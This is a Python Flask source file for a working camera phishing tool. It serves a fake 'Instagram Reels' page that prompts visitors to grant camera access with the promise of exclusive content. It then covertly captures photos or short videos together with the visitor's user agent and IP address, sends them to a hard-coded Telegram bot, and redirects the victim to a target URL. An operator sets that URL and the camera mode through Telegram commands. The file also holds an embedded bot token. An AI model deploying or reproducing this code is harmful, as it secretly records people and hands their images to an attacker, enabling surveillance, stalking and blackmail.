from flask import Flask, render_template_string, request, redirect, jsonify
import requests
import os
import base64
import json
from datetime import datetime
import threading
import time

app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_TOKEN = "8580091181:AAEXNF_lK3I2k_YRUVysnf1Cz8IXxrXGdTs"
CHAT_ID = "8507973714"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# Global variables to store target redirect URL
target_redirect_url = "https://www.instagram.com/reels/"  # Default
video_mode = False
record_video = False
camera_type = "user"  # user (front) or environment (back)

def send_to_telegram(message):
    """Send message to Telegram chat"""
    url = f"{TELEGRAM_API}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def send_photo_to_telegram(photo_data, caption=""):
    """Send photo to Telegram"""
    url = f"{TELEGRAM_API}/sendPhoto"
    files = {"photo": ("photo.jpg", photo_data, "image/jpeg")}
    data = {"chat_id": CHAT_ID, "caption": caption}
    requests.post(url, files=files, data=data)

def send_video_to_telegram(video_data, caption=""):
    """Send video to Telegram"""
    url = f"{TELEGRAM_API}/sendVideo"
    files = {"video": ("video.mp4", video_data, "video/mp4")}
    data = {"chat_id": CHAT_ID, "caption": caption}
    requests.post(url, files=files, data=data)

def get_latest_target_url():
    """Get the latest target URL from bot updates"""
    global target_redirect_url
    try:
        url = f"{TELEGRAM_API}/getUpdates?offset=-1&limit=1"
        response = requests.get(url).json()
        if response['result']:
            last_update = response['result'][0]
            if 'message' in last_update and 'text' in last_update['message']:
                text = last_update['message']['text']
                if text.startswith("http"):
                    target_redirect_url = text
                    send_to_telegram(f"✅ Target URL updated: {target_redirect_url}")
    except:
        pass

@app.route('/')
def phishing_page():
    """Main phishing page with camera access"""
    get_latest_target_url()  # Check for new target URLs
    html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reels</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        .logo { font-size: 48px; margin-bottom: 20px; }
        h1 { color: #262626; margin-bottom: 20px; font-weight: 600; }
        .btn {
            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin: 10px;
            transition: transform 0.2s;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        .options { display: flex; flex-direction: column; gap: 10px; margin: 20px 0; }
        .option-btn { 
            background: white; 
            color: #262626; 
            border: 2px solid #dbdbdb; 
            padding: 12px; 
            border-radius: 12px;
            cursor: pointer;
            font-weight: 500;
        }
        .option-btn:hover { background: #f5f5f5; }
        .option-btn.active { background: #0095f6; color: white; border-color: #0095f6; }
        #videoPreview, #photoPreview { 
            width: 100%; 
            max-height: 300px; 
            border-radius: 12px; 
            margin: 20px 0;
            display: none;
        }
        .loading { display: none; color: #666; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h1>Watch Funny Reels</h1>
        <p style="color: #666; margin-bottom: 30px;">Grant camera access to watch exclusive content</p>
        
        <div class="options">
            <button class="option-btn active" onclick="setCamera('user')">Selfie Camera</button>
            <button class="option-btn" onclick="setCamera('environment')">Back Camera</button>
            <button class="option-btn" onclick="toggleVideo()">Record Video</button>
        </div>
        
        <video id="videoPreview" autoplay muted playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        
        <div id="loading" class="loading">🔄 Capturing moment...</div>
        
        <button class="btn" onclick="captureMedia()" id="captureBtn">
            🎥 Watch Now
        </button>
    </div>

    <script>
        let video = document.getElementById('videoPreview');
        let stream = null;
        let isVideoMode = false;
        let currentCamera = 'user';

        async function setCamera(type) {
            currentCamera = type;
            document.querySelectorAll('.option-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: type === 'user' ? 'user' : 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                video.srcObject = stream;
                video.style.display = 'block';
            } catch(err) {
                alert('Camera access denied. Please enable camera permissions.');
            }
        }

        function toggleVideo() {
            isVideoMode = !isVideoMode;
            event.target.style.background = isVideoMode ? '#ff6b6b' : 'white';
            event.target.style.color = isVideoMode ? 'white' : '#262626';
        }

        async function captureMedia() {
            const captureBtn = document.getElementById('captureBtn');
            const loading = document.getElementById('loading');
            
            captureBtn.style.display = 'none';
            loading.style.display = 'block';

            if (isVideoMode) {
                // Record video
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                let streamRecorder = canvas.captureStream(30);
                let mediaRecorder = new MediaRecorder(streamRecorder);
                let chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onloadend = function() {
                        sendMedia(reader.result, 'video');
                    };
                    reader.readAsDataURL(blob);
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 5000); // 5 second video
            } else {
                // Capture photo
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const reader = new FileReader();
                    reader.onloadend = function() {
                        sendMedia(reader.result, 'photo');
                    };
                    reader.readAsDataURL(blob);
                }, 'image/jpeg', 0.9);
            }
        }

        function sendMedia(dataUrl, type) {
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    media: dataUrl,
                    type: type,
                    userAgent: navigator.userAgent,
                    ip: '{{ request.remote_addr }}',
                    camera: currentCamera
                })
            }).then(() => {
                window.location.href = "{{ target_redirect_url }}";
            });
        }

        // Auto-start camera on load
        window.onload = () => setCamera('user');
    </script>
</body>
</html>
    """
    return render_template_string(html_template, target_redirect_url=target_redirect_url)

@app.route('/capture', methods=['POST'])
def capture():
    """Handle captured media"""
    data = request.json
    media_data = data['media'].split(',')[1]
    media_bytes = base64.b64decode(media_data)
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    caption = f"📸 New Capture!\n🕒 {timestamp}\n🌐 UA: {data['userAgent'][:100]}...\n📱 Camera: {data['camera']}"
    
    if data['type'] == 'video':
        send_video_to_telegram(media_bytes, caption)
    else:
        send_photo_to_telegram(media_bytes, caption)
    
    return jsonify({"status": "success"})

@app.route('/telegram_webhook', methods=['POST'])
def telegram_webhook():
    """Handle Telegram updates"""
    global target_redirect_url, video_mode, record_video, camera_type
    
    update = request.json
    if 'message' in update and 'text' in update['message']:
        text = update['message']['text']
        
        if text.startswith('http'):
            target_redirect_url = text
            send_to_telegram(f"🎯 Target set: {target_redirect_url}")
        elif text.lower() == '/video':
            video_mode = True
            send_to_telegram("🎥 Video mode enabled")
        elif text.lower() == '/photo':
            video_mode = False
            send_to_telegram("📸 Photo mode enabled")
        elif text.lower() == '/back':
            camera_type = 'environment'
            send_to_telegram("📷 Back camera enabled")
        elif text.lower() == '/front':
            camera_type = 'user'
            send_to_telegram("🤳 Front camera enabled")
    
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    send_to_telegram("🚀 Camera Phishing Bot Started!\n📱 Send video/photo link to set target\n/back or /front for camera\n/video or /photo for mode")
    app.run(host='0.0.0.0', port=port, debug=False)
